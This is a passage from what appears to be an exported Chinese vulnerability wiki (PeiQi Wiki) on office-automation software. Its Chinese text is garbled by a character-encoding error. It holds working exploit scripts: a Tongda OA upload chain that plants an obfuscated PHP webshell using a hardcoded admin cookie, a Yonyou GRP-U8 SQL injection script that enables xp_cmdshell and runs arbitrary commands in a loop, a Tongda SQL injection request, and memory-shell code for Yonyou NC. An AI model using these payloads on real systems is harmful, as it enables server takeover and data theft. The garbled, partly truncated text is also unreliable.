\"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1(target_url, Cookie) [!NOTE] v11.8åŠä»¥ä¸‹å¯è¿æ¥èšå‰‘ç”Ÿæˆçš„webshellæ§åˆ¶,ä¸”ç”Ÿæˆåä¸éœ€è¦ç®¡ç†å‘˜Cookieå³å¯è¿æ¥ import requests import sys import random import re import base64 from requests.packages.urllib3.exceptions import InsecureRequestWarning def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: é€šè¾¾OA >> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36mCookie >>> xxxxxxxxxxxxxxxxxxxxxx \\033[0m') print('+------------------------------------------') def POC_1(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/.user\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkuaW5pIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCmF1dG9fcHJlcGVuZF9maWxlPXBlaXFpLmxvZwotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0CkNvbnRlbnQtRGlzcG9zaXRpb246IGZvcm0tZGF0YTsgbmFtZT0ic3VibWl0IgoK5o+Q5LqkCi0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tMTc1MTgzMjM5ODY1NDg5OTI5NTE5ODQwNTcxMDQtLQ==\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/.user \\033[0m\".format(target_url)) if \"æ¡£æ¡ˆå·²ä¿å­˜\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼ .user.iniæ–‡ä»¶, \\033[0m\".format(target_url)) POC_2(target_url, Cookie) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼ .user.iniæ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_2(target_url, Cookie): vuln_url = target_url + \"/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop\\workshop/report/attachment-remark/peiqi\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8\", \"Accept-Language\": \"zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\", \"Accept-Encoding\": \"gzip, deflate\", \"Content-Type\": \"multipart/form-data; boundary=---------------------------17518323986548992951984057104\", \"Connection\": \"close\", \"Cookie\": Cookie, \"Upgrade-Insecure-Requests\": \"1\", } data = base64.b64decode(\"LS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9IkFUVEFDSE1FTlQiOyBmaWxlbmFtZT0icGVpcWkubG9nIgpDb250ZW50LVR5cGU6IHRleHQvcGxhaW4KCjw/cGhwIAplY2hvICJQZWlRaV9XaWtpIjsKJGZPZ1Q9Y3JlYXRlX2Z1bmN0aW9uKGJhc2U2NF9kZWNvZGUoJ0pBPT0nKS5jaHIoMTE0MTk1Lzk5Mykuc3RyX3JvdDEzKCdiJykuc3RyX3JvdDEzKCd6JykuY2hyKDcwOC02MDcpLGNocigweGM2MGUvMHgxZjYpLmJhc2U2NF9kZWNvZGUoJ2RnPT0nKS5zdHJfcm90MTMoJ24nKS5jaHIoMzkwLTI4MikuY2hyKDB4MWFlLTB4MTg2KS5jaHIoMHgzYWMtMHgzODgpLmNocigweGQ1NjEvMHgxZGIpLmJhc2U2NF9kZWNvZGUoJ2J3PT0nKS5iYXNlNjRfZGVjb2RlKCdiUT09JykuYmFzZTY0X2RlY29kZSgnWlE9PScpLnN0cl9yb3QxMygnKScpLmNocig3OTgtNzM5KSk7JGZPZ1QoYmFzZTY0X2RlY29kZSgnT1RNMk4nLidETTNPMCcuJ0JsZGtGJy4nc0tDUmYnLicnLnN0cl9yb3QxMygnSCcpLnN0cl9yb3QxMygnUicpLmNocig0MTM4Mi83MjYpLnN0cl9yb3QxMygnRycpLmJhc2U2NF9kZWNvZGUoJ1ZnPT0nKS4nJy4nJy5iYXNlNjRfZGVjb2RlKCdSZz09Jykuc3RyX3JvdDEzKCdnJykuc3RyX3JvdDEzKCdEJykuYmFzZTY0X2RlY29kZSgnV2c9PScpLmNocigyMzc1MS8yNzMpLicnLidsUmFWMCcuJ3BPekk0Jy4nTURrek0nLidURTcnLicnKSk7Pz4KLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0xNzUxODMyMzk4NjU0ODk5Mjk1MTk4NDA1NzEwNApDb250ZW50LURpc3Bvc2l0aW9uOiBmb3JtLWRhdGE7IG5hbWU9InN1Ym1pdCIKCuaPkOS6pAotLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0tLTE3NTE4MzIzOTg2NTQ4OTkyOTUxOTg0MDU3MTA0LS0K\") try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.post(url=vuln_url, data=data, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/hr/manage/staff_info/update.php?USER_ID=../../general/reportshop/workshop/report/attachment-remark/peiqi \\033[0m\".format(target_url)) if \"æ¡£æ¡ˆå·²ä¿å­˜\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} æˆåŠŸä¸Šä¼  peiqi.log æ–‡ä»¶, \\033[0m\".format(target_url)) POC_3(target_url, Cookie) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸Šä¼  peiqi.log æ–‡ä»¶å¤±è´¥\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) def POC_3(target_url, Cookie): vuln_url = target_url + \"/general/reportshop/workshop/report/attachment-remark/form.inc.php?\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Cookie\": Cookie, } try: requests.packages.urllib3.disable_warnings(InsecureRequestWarning) response = requests.get(url=vuln_url, headers=headers, verify=False, timeout=5) print(\"\\033[36m[o] æ­£åœ¨è¯·æ±‚ {}/general/reportshop/workshop/report/attachment-remark/form.inc.php? \\033[0m\".format(target_url)) if \"PeiQi_Wiki\" in response.text and response.status_code == 200: print(\"\\033[32m[o] ç›®æ ‡ {} å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­åŒ…å« PeiQi_Wiki \\033[0m\".format(target_url)) print(\"\\033[32m[o] æˆåŠŸä¸Šä¼ èšå‰‘æœ¨é©¬ å¯†ç ä¸º: PeiQi \\n[o] webshellè·¯å¾„: {}/general/reportshop/workshop/report/attachment-remark/form.inc.php?\\033[0m\".format(target_url)) else: print(\"\\033[31m[x] ç›®æ ‡ {} ä¸å­˜åœ¨æ¼æ´ï¼Œå“åº”ä¸­ä¸åŒ…å« PeiQi_Wiki\\033[0m\".format(target_url)) sys.exit(0) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\", e) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) Cookie = \"PHPSESSID=ug4ip8ohugo61bmu399npplep5; USER_NAME_COOKIE=admin; OA_USER_ID=admin\" POC_1(target_url, Cookie) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 16:32:45 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.9 åå°SQLæ³¨å…¥æ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/é€šè¾¾OA/é€šè¾¾OA v11.9 åå°SQLæ³¨å…¥æ¼æ´.html","title":"é€šè¾¾OA v11.9 åå°SQLæ³¨å…¥æ¼æ´","keywords":"","body":"é€šè¾¾OA v11.9 åå°SQLæ³¨å…¥æ¼æ´ æ¼æ´æè¿° é€šè¾¾OA v11.9 åŠä»¥ä¸‹ç‰ˆæœ¬ä¸­ç”±äºæŸäº›å‚æ•°è¿‡æ»¤ä¸å®Œå–„å¯¼è‡´åå°å­˜åœ¨SQLæ³¨å…¥æ¼æ´ æ¼æ´å½±å“ [!NOTE] é€šè¾¾OA ç¯å¢ƒæ­å»º https://cdndown.tongda2000.com/oa/2019/TDOA11.9.exe åŒå‡»å®‰è£… æ¼æ´å¤ç° æ¼æ´æ–‡ä»¶ä½ webroot/general/appbuilder/modules/portal/controllers/WorkbenchController.php public function actionUpsharestatus() { Yii::$app->response->format = yii\\web\\Response::FORMAT_JSON; $data = modules\\appdesign\\models\\AppUtils::toGBK($_POST); if (modules\\portal\\controllers\\intval($data[\"uid\"]) == $_SESSION[\"LOGIN_UID\"]) { modules\\portal\\models\\PortalWorkbench::updateAll(array(\"state\" => \"{$data[\"status\"]}\"), \"id={$data[\"id\"]}\"); } else if ($data[\"status\"] == 1) { modules\\portal\\models\\PortalWorkbenchState::deleteAll(array(\"wids\" => \"{$data[\"id\"]}\", \"uid\" => \"{$_SESSION[\"LOGIN_UID\"]}\")); } else { $Work = new modules\\portal\\models\\PortalWorkbenchState(); $Work->wids = $data[\"id\"]; $Work->uid = $_SESSION[\"LOGIN_UID\"]; $Work->save(); } $dataBack = array(\"status\" => 1, \"msg\" => modules\\portal\\controllers\\_(\"æ“ä½œæˆåŠŸ\")); $dataBack = modules\\appdesign\\models\\AppUtils::toUTF8($dataBack); return $dataBack; } å…¶ä¸­ updateAll() å‡½æ•°å¹¶æ²¡æœ‰ä½¿ç”¨é˜²æ­¢ SQLæ³¨å…¥çš„ sql_injection() æ¥é˜²æ­¢æ³¨å…¥ webroot/inc/conn.php æ‰€ä»¥è¿™é‡Œå°±å‡ºç°äº† id å‚æ•°å­˜åœ¨æ³¨å…¥çš„æƒ…å†µï¼Œè¯·æ±‚åŒ…å¦‚ä¸‹ POST /general/appbuilder/web/portal/workbench/upsharestatus HTTP/1.1 Host: oa.tongda2000.com Connection: close Content-Length: 36 Cache-Control: max-age=0 sec-ch-ua: \"Google Chrome\";v=\"89\", \"Chromium\";v=\"89\", \";Not A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.114 Safari/537.36 Origin: https://oa.tongda2000.com Content-Type: application/x-www-form-urlencoded Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: same-origin Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Referer: https://oa.tongda2000.com/general/appbuilder/web/portal/workbench/upsharestatus Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9,en-US;q=0.8,en;q=0.7,zh-TW;q=0.6 Cookie: __root_domain_v=.tongda2000.com; SID_12=5ea03399; USER_NAME_COOKIE=chenqiang; Hm_lvt_7cbefde9059536a2b96aaafc134d625c=1617014067,1617196083; _qddaz=QD.677915359373668; PHPSESSID=nso4iqhvp2qi464eoavk2fn0c0; OA_USER_ID=chenqiang; SID_15=ded66d80; LAST_OPERATION_TIME=1617242241 x-forwarded-for: 127.0.0.1 x-originating-ip: 127.0.0.1 x-remote-ip: 127.0.0.1 x-remote-addr: 127.0.0.1 uid=15&status=1&id=1;select sleep(4) æ³¨æ„ uidå‚æ•° è¦ä¸ºå½“å‰ç”¨æˆ·çš„uidæ‰èƒ½å®Œæˆè¯·æ±‚ï¼Œå¯ä»¥ä½¿ç”¨ burp éå†æŸ¥çœ‹æ—¶é—´å“åº” ä¾‹å¦‚è¿™é‡Œä½¿ç”¨å®˜ç½‘çš„æµ‹è¯•è´¦æˆ· uid éå†å‡ºä¸º 15 å¦‚æœuidé”™è¯¯åˆ™ä¸ä¼šå‡ºç°æ—¶é—´å»¶è¿Ÿï¼Œå°†è¯·æ±‚åŒ…æ”¾å…¥ Sqlmapè·‘ä¸€ä¸‹ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-06-08 16:36:13 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/","title":"ç”¨å‹OA","keywords":"","body":"ç”¨å‹ ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923 ç”¨å‹ NC bsh.servlet.BshServlet è¿œç¨‹å‘½ä»¤æ‰§è¡Œæ¼æ´ ç”¨å‹ NC ååºåˆ—åŒ–RCEæ¼æ´ ç”¨å‹ NC XbrlPersistenceServletååºåˆ—åŒ– ç”¨å‹ U8 OA test.jsp SQLæ³¨å…¥æ¼æ´ ç”¨å‹ERP-NC ç›®å½•éå†æ¼æ´ PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-31 22:06:19 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923.html","title":"ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923","keywords":"","body":"ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šè´¢åŠ¡ç®¡ç†è½¯ä»¶ SQLæ³¨å…¥ CNNVD-201610-923 æ¼æ´æè¿° ç”¨å‹GRP-u8å­˜åœ¨XXEæ¼æ´ï¼Œè¯¥æ¼æ´æºäºåº”ç”¨ç¨‹åºè§£æXMLè¾“å…¥æ—¶æ²¡æœ‰è¿›åˆ¶å¤–éƒ¨å®ä½“çš„åŠ è½½ï¼Œå¯¼è‡´å¯åŠ è½½å¤–éƒ¨SQLè¯­å¥ï¼Œä»¥åŠå‘½ä»¤æ‰§è¡Œ å½±å“ç‰ˆæœ¬ [!NOTE] ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šå†…æ§ç®¡ç†è½¯ä»¶ï¼ˆæ–°æ”¿åºœä¼šè®¡åˆ¶åº¦ä¸“ç‰ˆï¼‰ FOFA [!NOTE] title=\"ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šå†…æ§ç®¡ç†è½¯ä»¶\" æ¼æ´å¤ç° æ¼æ´åˆ©ç”¨POCè¯·æ±‚åŒ… POST /Proxy HTTP/1.1 Accept: Accept: */* Content-Type: application/x-www-form-urlencoded User-Agent: Mozilla/4.0 (compatible; MSIE 6.0;) Host: host Content-Length: 357 Connection: Keep-Alive Cache-Control: no-cache cVer=9.8.0&dp=XML AS_DataRequest ProviderNameDataSetProviderData Dataselect @@version è¯·æ±‚åæŒ‰F12æŸ¥çœ‹æºä»£ç å¯ä»¥å¾—åˆ°SQLè¯­å¥æŸ¥è¯¢ç»“æœ ä¹Ÿå¯ä»¥è°ƒç”¨ xp_cmdshell æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤(å¤§éƒ¨åˆ†æ­¤ç³»ç»Ÿä¸ºwindows) [!NOTE] æ³¨æ„ï¼šå¤§éƒ¨åˆ†é»˜è®¤æ˜¯ä¸å¼€å¯ xp_cmdshell æ¨¡å—çš„ å¯ä»¥ä½¿ç”¨å¦‚ä¸‹æ–¹æ³•æ‰“å¼€xp_cmdshellæ–¹æ³• å°†å¦‚ä¸‹POSTæ•°æ®æŒ‰é¡ºåºå‘é€(æ³¨æ„ master æ”¹ä¸ºå½“å‰æ•°æ®åº“å) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatause master cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'show advanced options',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec sp_configure 'xp_cmdshell',1 cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDatareconfigure [!NOTE] å‘é€å¦‚ä¸Šå®é™…ä¸ºæ‰§è¡ŒSQLè¯­å¥æ‰“å¼€ xp_cmdshell use master; exec sp_configure 'show advanced options',1; reconfigure; exec sp_configure 'xp_cmdshell',1; reconfigure; å†å‘é€ä»¥ä¸‹æ•°æ®å¯æˆåŠŸä½¿ç”¨(ä¹Ÿå¯èƒ½å¤±è´¥) cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\" [!NOTE] æ‰§è¡Œè¿‡ç¨‹ä¸­æŠ¥é”™ java.sql.SQLExceptionã€é”™è¯¯ä»£ç : 0; ç›¸å…³ä¿¡æ¯:xxxxxxã€‘ä¸ç”¨ç†ä¼š å‘é€è¯·æ±‚åå†ä½¿ç”¨æ­¤æ¨¡å—åˆ™ä¼šæˆåŠŸè¯·æ±‚æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ æ¼æ´åˆ©ç”¨POC #!/usr/bin/python3 #-*- coding:utf-8 -*- # author : PeiQi # from : http://wiki.peiqi.tech import requests import re import sys def title(): print('+------------------------------------------') print('+ \\033[34mPOC_Des: http://wiki.peiqi.tech \\033[0m') print('+ \\033[34mGithub : https://github.com/PeiQi0 \\033[0m') print('+ \\033[34må…¬ä¼—å· : PeiQiæ–‡åº“ \\033[0m') print('+ \\033[34mVersion: ç”¨å‹GRP-U8è¡Œæ”¿äº‹ä¸šå†…æ§ç®¡ç†è½¯ä»¶ \\033[0m') print('+ \\033[36mä½¿ç”¨æ ¼å¼: python3 CNNVD-201610-923.py \\033[0m') print('+ \\033[36mUrl >>> http://xxx.xxx.xxx.xxx \\033[0m') print('+ \\033[36m(Y/N) >>> Y or N \\033[0m') print('+ \\033[36mcmd >>> ipconfig \\033[0m') print('+------------------------------------------') def POC_1(target_url): check_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataselect 1,user,db_name(),host_name(),@@version\"\"\" try: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:select 1,user,db_name(),host_name(),@@version...\\033[0m\") response = requests.post(url=check_url, headers=headers, data=data, timeout=10) row_1 = '> æ•°æ®åº“ç”¨æˆ·ä¸º:{}\\033[0m\".format(db_user)) print(\"\\033[32m >> æ•°æ®åº“åä¸º:{}\\033[0m\".format(db_name)) print(\"\\033[32m >> æ•°æ®åº“ä¸»æœºåä¸º:{}\\033[0m\".format(db_host)) print(\"\\033[32m >> æ•°æ®åº“ç‰ˆæœ¬ä¸º:{}\\033[0m\".format(db_vers)) return db_name else: print(\"\\033[31m[x] æ¼æ´å·²è¢«ä¿®å¤ \\033[0m\") sys.exit(0) except: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥ \\033[0m\") sys.exit(0) def xp_cmdshell_open(target_url, db_name): open_sql = [\"use {}\".format(db_name),\"exec sp_configure 'show advanced options',1\",\"reconfigure\",\"exec sp_configure 'xp_cmdshell',1\",\"reconfigure\"] num = 1 for sql in open_sql: open_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataData{}'.format(sql) try: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:{}...\\033[0m\".format(sql)) response = requests.post(url=open_url, headers=headers, data=data, timeout=10) num = num + 1 if num == 5 : POC_2(target_url, db_name) except: print(\"\\033[31m[x] å¼€å¯ xp_cmdsheall å¤±è´¥ \\033[0m\") sys.exit(0) def POC_2(target_url, db_name): db_name = db_name sql_cmd_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = \"\"\"cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"whoami\"\"\"\" try: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell 'whoami'...\\033[0m\") response = requests.post(url=sql_cmd_url, headers=headers, data=data, timeout=10) if 'exec xp_cmdshell' in response.text: print(\"\\033[31m[x] æ•°æ®åº“æœªå¼€å¯ xp_cmdshell æ¨¡å—\\033[0m\") sqlcmd_open = str(input(\"\\033[35mæ˜¯å¦å¼€å¯ xp_cmdshell\\n(Y/N) >>> \\033[0m\")) if sqlcmd_open == 'Y' or sqlcmd_open == 'y': xp_cmdshell_open(target_url, db_name) else: print(\"\\033[31m[x] åœæ­¢å¼€å¯ xp_cmdshell \\033[0m\") sys.exit(0) else: whoami = re.findall(r'output=\"(.*?)\"', response.text)[0] print(\"\\033[32m[o] æˆåŠŸæ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell 'whoami'...\\n>>> {}\\033[0m\".format(whoami)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) def POC_3(target_url, cmd): vuln_url = target_url + \"/Proxy\" headers = { \"User-Agent\": \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/86.0.4240.111 Safari/537.36\", \"Content-Type\": \"application/x-www-form-urlencoded\" } data = 'cVer=9.8.0&dp=XMLAS_DataRequestProviderNameDataSetProviderDataDataexec xp_cmdshell \"{}\"'.format(cmd) try: print(\"\\033[32m[o] æ­£åœ¨æ‰§è¡ŒSQLè¯­å¥:exec xp_cmdshell '{}'...\\033[0m\".format(cmd)) response = requests.post(url=vuln_url, headers=headers, data=data, timeout=10) data = re.findall(r'output=\"(.*?)\"', response.text) for i in data: print(\"\\033[32m >>> {}\\033[0m\".format(i)) except Exception as e: print(\"\\033[31m[x] è¯·æ±‚å¤±è´¥:{} \\033[0m\".format(e)) sys.exit(0) if __name__ == '__main__': title() target_url = str(input(\"\\033[35mPlease input Attack Url\\nUrl >>> \\033[0m\")) db_name = POC_1(target_url) POC_2(target_url, db_name) while True: cmd = input(\"\\033[35mCmd >>> \\033[0m\") if cmd == \"exit\": sys.exit(0) else: POC_3(target_url, cmd) PeiQi WiKiæ–‡åº“ all right reservedï¼Œpowered by Gitbookæ–‡ä»¶æ›´æ–°æ—¶é—´ï¼š 2021-05-20 23:44:41 "},"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ NC ååºåˆ—åŒ–RCEæ¼æ´.html":{"url":"PeiQi_Wiki/OAäº§å“æ¼æ´/ç”¨å‹OA/ç”¨å‹ NC ååºåˆ—åŒ–RCEæ¼æ´.html","title":"ç”¨å‹ NC ååºåˆ—åŒ–RCEæ¼æ´","keywords":"","body":"ç”¨å‹ NC ååºåˆ—åŒ–RCEæ¼æ´ æ¼æ´æè¿° ç”¨å‹NC å­˜åœ¨ååºåˆ—åŒ– RCEæ¼æ´ï¼Œæ”»å‡»è€…å¯åˆ©ç”¨æ§åˆ¶æœåŠ¡å™¨ æ¼æ´å½±å“ [!NOTE] ç”¨å‹ NC æ¼æ´å¤ç° é¦–å…ˆä»ä»»æ„æ–‡ä»¶ä¸Šä¼ è¯´èµ· ä»»æ„æ–‡ä»¶ä¸Šä¼ åˆ†æä»£ç åœ¨servlet.FileReceiveServletã€‚åœ¨è¿™é‡Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°ï¼Œä»è¯·æ±‚ä¸­è¯»å–æµï¼Œç„¶åè½¬æ¢ä¸ºmapç±»å‹å¹¶è¯»å–ä¸Šä¼ æ–‡ä»¶çš„è·¯å¾„ã€‚ç„¶åå†è¯»å–å¾…ä¸Šä¼ çš„æ–‡ä»¶ã€‚ è€Œç½‘ä¸Šå¾ˆå¤špocï¼Œå¤§å¤šéƒ½æ˜¯åŸºäºæ­¤æ¼æ´ï¼Œåˆ©ç”¨ååºåˆ—åŒ–ä¸Šä¼ ä¸€ä¸ªæ–‡ä»¶åˆ°æœåŠ¡å™¨ã€‚ è¿™ä¹Ÿå°±æ˜¯å»å¹´çš„é‚£ä¸ªä»»æ„æ–‡ä»¶ä¸Šä¼ çš„ååºåˆ—åŒ–æ¼æ´ã€‚ä½†æ˜¯ï¼Œä½†æ˜¯ï¼Œè¿™ä¸ªæ¼æ´æœ¬è´¨æ˜¯ä¸€ä¸ªååºåˆ—åŒ–æ¼æ´ã€‚è€Œä¸”æŸCçš„classpathä¸­ï¼Œä¹Ÿå­˜åœ¨apache commonscollectionsåº“ï¼Œæˆ‘ä»¬å¯ä»¥åˆ©ç”¨è¿™ä¸ªåº“ï¼Œç›´æ¥æ‰§è¡Œå‘½ä»¤æˆ–è€…å†…å­˜é©¬ã€‚å²‚ä¸æ˜¯æ¯”ä»»æ„æ–‡ä»¶ä¸Šä¼ èˆ’æœå¤šäº†ã€‚ å†…å­˜é©¬ è€æ ·å­ï¼Œåœ¨ååºåˆ—åŒ–ä¸­æƒ³æ‰§è¡Œä»»æ„ä»£ç ï¼Œä¸€èˆ¬éƒ½ä¾é xalanè¿™ä¸ªåº“ã€‚è¿™æ¬¡ä¹Ÿä¸ä¾‹å¤–ã€‚ æ¤å…¥å†…å­˜é©¬ï¼Œå…³é”®åœ¨äºæˆ‘ä»¬æ€æ ·æ‰¾åˆ°contextï¼Œåªæœ‰æ‰¾åˆ°contextï¼Œæˆ‘ä»¬æ‰å¯ä»¥æ·»åŠ filterã€‚å¥½åœ¨æŸcä¸­ï¼Œæˆ‘ä»¬åªéœ€è¦é€šè¿‡ä¸‹é¢çš„ä»£ç æ—¢å¯ä»¥è·å–å½“å‰contextï¼Œä¸éœ€è¦ä»tomcatä¸­è·å–context Object obj = æ”¹åŠ¨Locator.getInstance().lookup(\"ServletContext\"); Field contextField = obj.getClass().getDeclaredField(\"context\"); contextField.setAccessible(true); obj = contextField.get(obj); Field contextField1 = obj.getClass().getDeclaredField(\"context\"); contextField1.setAccessible(true); addFitlertoTomcat(contextField1.get(obj)); å‰©ä¸‹çš„å°±æ˜¯å¸¸è§„æ“ä½œï¼Œå¯ä»¥çœ‹æˆ‘ä¹‹å‰çš„å†…å­˜é©¬æ¨¡å‹ï¼ŒåŸºæœ¬ä¸éœ€è¦å¾ˆå¤§çš„æ”¹åŠ¨å³å¯å®Œç¾é€‚é…ã€‚ å›æ˜¾ æˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°è¿™æ 